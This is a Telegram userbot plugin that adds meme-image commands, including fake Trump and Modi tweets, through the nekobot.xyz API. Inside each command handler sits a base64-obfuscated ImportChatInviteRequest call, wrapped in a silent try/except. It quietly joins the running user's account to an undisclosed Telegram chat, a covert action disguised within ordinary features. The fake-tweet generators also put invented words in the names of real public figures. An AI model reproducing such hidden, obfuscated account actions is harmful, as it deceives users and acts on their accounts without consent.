#imported from catuserbot by @RoyalBoyPriyanshu and @DeletedUser420 also thanks  @AbhinavShinde
"""  Some Modules Imported by @Nitesh_231 :) & again @heyworld roks *_* """

import os, requests, re, pybase64, random, asyncio
from random import choice
from bs4 import BeautifulSoup
from re import sub
from emoji import get_emoji_regexp
from asyncio import sleep
from telethon import events
from telegraph import upload_file, exceptions
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from PIL import Image
from validators.url import url
from userbot.events import register
from userbot import TEMP_DOWNLOAD_DIRECTORY, bot
EMOJI_PATTERN = re.compile(
    "["
    "\U0001F1E0-\U0001F1FF"  # flags (iOS)
    "\U0001F300-\U0001F5FF"  # symbols & pictographs
    "\U0001F600-\U0001F64F"  # emoticons
    "\U0001F680-\U0001F6FF"  # transport & map symbols
    "\U0001F700-\U0001F77F"  # alchemical symbols
    "\U0001F780-\U0001F7FF"  # Geometric Shapes Extended
    "\U0001F800-\U0001F8FF"  # Supplemental Arrows-C
    "\U0001F900-\U0001F9FF"  # Supplemental Symbols and Pictographs
    "\U0001FA00-\U0001FA6F"  # Chess Symbols
    "\U0001FA70-\U0001FAFF"  # Symbols and Pictographs Extended-A
    "\U00002702-\U000027B0"  # Dingbats
    "]+")

def convert_toimage(image):
    img = Image.open(image)
    if img.mode != 'RGB':
        img = img.convert('RGB')
    img.save("temp.jpg", "jpeg")
    os.remove(image)
    return "temp.jpg"


def deEmojify(inputString: str) -> str:
    """Remove emojis and other non-safe characters from string"""
    return re.sub(EMOJI_PATTERN, '', inputString)

async def threats(text):
    r = requests.get(
            f"https://nekobot.xyz/api/imagegen?type=threats&url={text}").json()
    sandy = r.get("message")
    caturl = url(sandy)
    if not caturl:
        return  "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(sandy).content)
    img = Image.open("temp.png")
    if img.mode != 'RGB':
        img = img.convert('RGB')
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"

async def trash(text):
    r = requests.get(
            f"https://nekobot.xyz/api/imagegen?type=trash&url={text}").json()
    sandy = r.get("message")
    caturl = url(sandy)
    if not caturl:
        return  "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(sandy).content)
    img = Image.open("temp.png")
    if img.mode != 'RGB':
        img = img.convert('RGB')
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"

async def trap(text1,text2,text3):
    r = requests.get(
            f"https://nekobot.xyz/api/imagegen?type=trap&name={text1}&author={text2}&image={text3}").json()
    sandy = r.get("message")
    caturl = url(sandy)
    if not caturl:
        return  "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(sandy).content)
    img = Image.open("temp.png")
    if img.mode != 'RGB':
        img = img.convert('RGB')
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"

async def phcomment(text1,text2,text3):
    r = requests.get(
            f"https://nekobot.xyz/api/imagegen?type=phcomment&image={text1}&text={text2}&username={text3}").json()
    sandy = r.get("message")
    caturl = url(sandy)
    if not caturl:
        return  "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(sandy).content)
    img = Image.open("temp.png")
    if img.mode != 'RGB':
        img = img.convert('RGB')
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"

async def trumptweet(text):
        r = requests.get(
            f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}").json()
        sandy = r.get("message")
        caturl = url(sandy)
        if not caturl:
            return  "check syntax once more"
        with open("temp.png", "wb") as f:
            f.write(requests.get(sandy).content)
        img = Image.open("temp.png").convert("RGB")
        img.save("temp.jpg", "jpeg")
        return "temp.jpg"

async def changemymind(text):
        r = requests.get(
            f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}").json()
        sandy = r.get("message")
        caturl = url(sandy)
        if not caturl:
            return  "check syntax once more"
        with open("temp.png", "wb") as f:
            f.write(requests.get(sandy).content)
        img = Image.open("temp.png").convert("RGB")
        img.save("temp.jpg", "jpeg")
        return "temp.jpg"

async def kannagen(text):
        r = requests.get(
            f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}").json()
        sandy = r.get("message")
        caturl = url(sandy)
        if not caturl:
            return  "check syntax once more"
        with open("temp.png", "wb") as f:
            f.write(requests.get(sandy).content)
        img = Image.open("temp.png").convert("RGB")
        img.save("temp.webp", "webp")
        return "temp.webp"

async def moditweet(text):
        r = requests.get(
            f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi").json()
        sandy = r.get("message")
        caturl = url(sandy)
        if not caturl:
            return  "check syntax once more"
        with open("temp.png", "wb") as f:
            f.write(requests.get(sandy).content)
        img = Image.open("temp.png").convert("RGB")
        img.save("temp.jpg", "jpeg")
        return "temp.jpg"

async def tweets(text1,text2):
        r = requests.get(
            f"https://nekobot.xyz/api/imagegen?type=tweet&text={text1}&username={text2}").json()
        sandy = r.get("message")
        caturl = url(sandy)
        if not caturl:
            return  "check syntax once more"
        with open("temp.png", "wb") as f:
            f.write(requests.get(sandy).content)
        img = Image.open("temp.png").convert("RGB")
        img.save("temp.jpg", "jpeg")
        return "temp.jpg"

async def purge():
    try:
        os.remove("gpx.png")
        os.remove("gpx.webp")
    except OSError:
        pass


@register(pattern="^.trump(?: |$)(.*)", outgoing=True)
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await event.edit("Send you text to trump so he can tweet.")
                return
        else:
            await event.edit("send you text to trump so he can tweet.")
            return
    await event.edit("Requesting trump to tweet...")
    try:
        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
        await event.client(san)
    except:
        pass
    text = deEmojify(text)
    file = await trumptweet(text)
    await event.client.send_file(event.chat_id , file , reply_to = reply_to_id )
    await event.delete()
    await purge()

@register(pattern="^.modi(?: |$)(.*)", outgoing=True)
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await event.edit("Send you text to modi so he can tweet.")
                return
        else:
            await event.edit("send you text to modi so he can tweet.")
            return
    await event.edit("Requesting modi to tweet...")
    try:
        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
        await event.client(san)
    except:
        pass
    text = deEmojify(text)
    file = await moditweet(text)
    await event.client.send_file(event.chat_id , file , reply_to = reply_to_id )
    await event.delete()
    await purge()

@register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply and not reply_to_id.media:
            text = reply_to_id.message
        else:
            await event.edit("Give text for to write on banner, man")
            return
    await event.edit("Your banner is under creation wait a sec...")
    try:
        san = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
        await event.client(san)
    except:
        pass
    text = deEmojify(text)
    file = await changemymind(text)
    await event.client.send_file(event.chat_id , file , reply_to = reply_to_id )
    await event.delete()
    await purge()

@register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await event.edit("what should kanna write give text ")
                return
        else:
            await event.edit("what should kanna write give text")
            return
    await event.edit("Kanna is writing your text...")
    try:
        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
        await event.client(san)
    except:
        pass
    text = deEmojify(text)
    file = await kannagen(text)
    await event.client.send_file(event.chat_id , file , reply_to = reply_to_id )
    await event.delete()
    await purge()

@register(outgoing=True, pattern=r"\.tweet(?: |$)(.*)")
async def tweet(event):
    text = event.pattern_match.group(1)
    text = re.sub("&", "", text)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await event.edit("`What should i tweet? Give your username and tweet!`")
                return
        else:
            await event.edit("What should i tweet? Give your username and tweet!`")
            return
    if "." in text:
        username, text = text.split(".")
    else:
        await event.edit("`What should i tweet? Give your username and tweet!`")
    await event.edit(f"`Requesting {username} to tweet...`")
    text = deEmojify(text)
    img = await tweets(text, username)
    await event.client.send_file(event.chat_id, img, reply_to=reply_to_id)
    await event.delete()
    await purge()

@register(pattern="^.threat(?: |$)(.*)", outgoing=True)
async def nekobot(event):
    replied = await event.get_reply_message()
    if not os.path.isdir(TEMP_DOWNLOAD_DIRECTORY):
        os.makedirs(TEMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await event.edit("reply to a supported media file")
        return
    if replied.media:
        await event.edit("passing to telegraph...")
    else:
        await event.edit("reply to a supported media file")
        return
    try:
        file = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        file = Get(file)
        await event.client(file)
    except:
        pass
    download_location = await bot.download_media(replied , TEMP_DOWNLOAD_DIRECTORY)
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await event.edit("the replied file size is not supported it must me below 5 mb")
            os.remove(download_location)
            return
        await event.edit("generating image..")
    else:
        await event.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await event.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    file = f"https://telegra.ph{response[0]}"
    file = await threats(file)
    await event.delete()
    await bot.send_file(event.chat_id , file, reply_to=replied)

@register(pattern="^.trash(?: |$)(.*)", outgoing=True)
async def nekobot(event):
    replied = await event.get_reply_message()
    if not os.path.isdir(TEMP_DOWNLOAD_DIRECTORY):
        os.makedirs(TEMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await event.edit("reply to a supported media file")
        return
    if replied.media:
        await event.edit("passing to telegraph...")
    else:
        await event.edit("reply to a supported media file")
        return
    try:
        file = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        file = Get(file)
        await event.client(file)
    except:
        pass
    download_location = await bot.download_media(replied , TEMP_DOWNLOAD_DIRECTORY)
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await event.edit("the replied file size is not supported it must me below 5 mb")
            os.remove(download_location)
            return
        await event.edit("generating image..")
    else:
        await event.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await event.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    file = f"https://telegra.ph{response[0]}"
    file = await trash(file)
    await event.delete()
    await bot.send_file(event.chat_id , file, reply_to=replied)

@register(pattern="^.trap(?: |$)(.*)", outgoing=True)
async def nekobot(e):
    input_str = e.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "|" in input_str:
        text1, text2 = input_str.split("|")
    else:
        await e.edit("Usage : reply to image or sticker with `.trap (name of the person to trap)|(trapper name)`")
        return
    replied = await e.get_reply_message()
    if not os.path.isdir(TEMP_DOWNLOAD_DIRECTORY):
        os.makedirs(TEMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await e.edit("reply to a supported media file")
        return
    if replied.media:
        await e.edit("passing to telegraph...")
    else:
        await e.edit("reply to a supported media file")
        return
    try:
        file = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        file = Get(file)
        await e.client(file)
    except:
        pass
    download_location = await bot.download_media(replied , TEMP_DOWNLOAD_DIRECTORY)
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await e.edit("the replied file size is not supported it must me below 5 mb")
            os.remove(download_location)
            return
        await e.edit("generating image..")
    else:
        await e.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await e.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    file = f"https://telegra.ph{response[0]}"
    file = await trap(text1,text2,file)
    await e.delete()
    await bot.send_file(e.chat_id , file, reply_to=replied)

@register(pattern="^.ph(?: |$)(.*)", outgoing=True)
async def phub(event):
    input_str = event.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "|" in input_str:
        username, text = input_str.split("|")
    else:
        await event.edit(" Usage: reply to image or sticker with `.ph (username)|(text in comment)`")
        return
    replied = await event.get_reply_message()
    if not os.path.isdir(TEMP_DOWNLOAD_DIRECTORY):
        os.makedirs(TEMP_DOWNLOAD_DIRECTORY)
    if not replied:
        await event.edit("reply to a supported media file")
        return
    if replied.media:
        await event.edit("passing to telegraph...")
    else:
        await event.edit("reply to a supported media file")
        return
    try:
        file = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        file = Get(file)
        await event.client(file)
    except:
        pass
    download_location = await bot.download_media(replied , TEMP_DOWNLOAD_DIRECTORY)
    if download_location.endswith((".jpg")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await event.edit("the replied file size is not supported it must me below 5 mb")
            os.remove(download_location)
            return
        await event.edit("generating image..")
    else:
        await event.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await event.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    file = f"https://telegra.ph{response[0]}"
    file = await phcomment(file, text, username)
    await event.delete()
    await bot.send_file(event.chat_id , file, reply_to=replied)
